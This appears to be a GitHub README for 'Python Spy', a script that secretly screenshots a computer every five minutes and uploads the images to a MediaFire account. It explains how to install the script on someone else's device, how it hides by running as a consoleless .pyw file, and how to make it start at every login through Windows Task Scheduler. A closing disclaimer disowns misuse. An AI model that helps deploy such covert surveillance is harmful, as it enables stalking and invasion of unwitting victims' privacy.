# Python Spy

## About

This is a python scipt that can be used to spy on someone's computer. The program takes a screenshot of the computer screen after every 5 minutes and uploads it to [mediafire](https://www.mediafire.com).

## Getting Started

To get started, make an account on mediafire and enter you email and password in the respective variables in the python file (`mediafireAccEmail` and `mediafireAccPwd`). Also create a folder in your account named `Spy`. All the screenshots will go to this folder.

### Prerequisites

Install the python packages :-

- Python (on the computer you want to spy)
- PyAutoGUI
- Pillow
- Mediafire

```bash
$ pip install pyautogui
$ pip install pillow
$ pip install mediafire
```

### Installing

Install this repository from github on the computer you want to spy on and after installing the above packages and entering your account credentials, you can test the program by running -

```bash
$ python main.pyw
```

Note that this program uses a `.pyw` file instead of `.py`. A pyw file is basically a python file but it executes without opening the console. So, there is no visual sign that the program is running.

## Usage

After this progam is installed on someone's device and working fine, you can automate it to run as soon as the user logs into the device. Currently I only know how to do that on windows. If you know how to do that on Linux/MacOS, you can fork this repository and add that aswell :). Follow the following steps :-

(Alternately, you can follow this - https://www.jcchouinard.com/python-automation-using-task-scheduler/)

1. Open the Windows Task Scheduler (not to be confused with Task Manager).
2. Create a new task.
3. After giving the name and general things, create a new trigger.
4. After that, create an action and choose "Start a program".
5. In the program/script option, browse for the python file. (You can leave the arguments and start in options empty).
6. Finish making the task.

Now whenever that device is switched on, the program will run and screenshots will appear in your mediafire account. (You can use any file hosting service of your choice but you will have to tweak the code for it).

## Disclaimer

- Neither the project nor do I (the owner) promote any kind of illegal activity and are not responsible for any misuse or damage caused by this project.

- Please do not use this tool on other people's devices to harm others.

- It is the end user's responsibility to obey all applicable local, state, federal, and international laws.